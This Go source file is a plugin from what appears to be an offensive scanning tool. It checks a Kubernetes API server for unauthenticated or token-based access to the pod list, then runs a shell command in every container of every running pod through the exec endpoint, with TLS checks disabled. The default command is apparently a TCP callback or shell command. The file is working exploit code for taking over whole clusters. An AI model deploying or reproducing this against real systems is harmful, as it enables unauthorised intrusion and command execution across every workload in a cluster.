package plugins

import (
	"crypto/tls"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/pkg/schema"
	"github.com/tidwall/gjson"
)

func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
	opts := schema.K8sRequestOption{
		Token:    info.Token,
		Endpoint: fmt.Sprintf("https://%s:%s", info.Host, info.Port),
		Api:      "/api/v1/pods",
		Method:   "GET",
	}
	resp, err := schema.ServerAccountRequest(opts)
	if err != nil || !strings.Contains(resp, "items") {
		return false, err
	}
	pods := gjson.Get(resp, "items").Array()
	result := fmt.Sprintf("[%s:%s] There are %d pods in the cluster.",
		info.Host, info.Port, len(pods))
	log.Println(result)
	if info.Queue != nil {
		vuln := common.Vuln{
			Host: info.Host,
			Port: info.Port,
		}
		if info.Token == "" {
			vuln.Unauth = true
		} else {
			vuln.Token = info.Token
		}
		info.Queue.Push(vuln)
	}

	if info.DisableExp && info.Command == "" {
		return true, err
	}
	var cmd string
	if !info.DisableExp {
		cmd = info.Commands.TCPCommand
	} else {
		cmd = info.Command
	}
	// batch command execution
	if cmd != "" {
		for _, p := range pods {
			pn := p.Get("metadata.name").String()
			ns := p.Get("metadata.namespace").String()
			status := p.Get("status.phase").String()
			if status != "Running" {
				continue
			}
			for _, c := range p.Get("spec.containers").Array() {
				// 批量pods执行时忽略报错
				api := fmt.Sprintf(opts.Endpoint+
					"/api/v1/namespaces/%s/pods/%s/exec"+
					"?container=%s&command=/bin/sh&command=-c&command=%s&stderr=true&stdin=true&stdout=true",
					ns, pn, c.Get("name").String(), url.QueryEscape(cmd))
				_, err := kubeAPIExec(info, api)
				if strings.Contains(err.Error(), "forbidden") &&
					strings.Contains(err.Error(), "pods/exec") {
					return false, err
				}
			}
		}
	}
	return true, err
}

func kubeAPIExec(info *common.HostInfo, api string) (bool, error) {
	httpclient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: time.Duration(info.Timeout) * time.Second,
	}
	req, err := http.NewRequest("GET", api, nil)
	if err != nil {
		return false, err
	}
	req.Header.Add("Authorization", "Bearer "+info.Token)
	req.Header.Add("Connection", "Upgrade")
	req.Header.Add("Upgrade", "websocket")
	req.Header.Add("Sec-Websocket-Version", "13")
	req.Header.Add("Sec-Websocket-Key", "lazyscan")
	resp, err := httpclient.Do(req)
	if err != nil {
		return false, err
	}
	raw, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}
	if resp.StatusCode == http.StatusSwitchingProtocols {
		if info.Command != "" {
			fmt.Println(api)
			fmt.Println(string(raw))
		}
		return true, nil
	}
	return false, errors.New(string(raw))
}
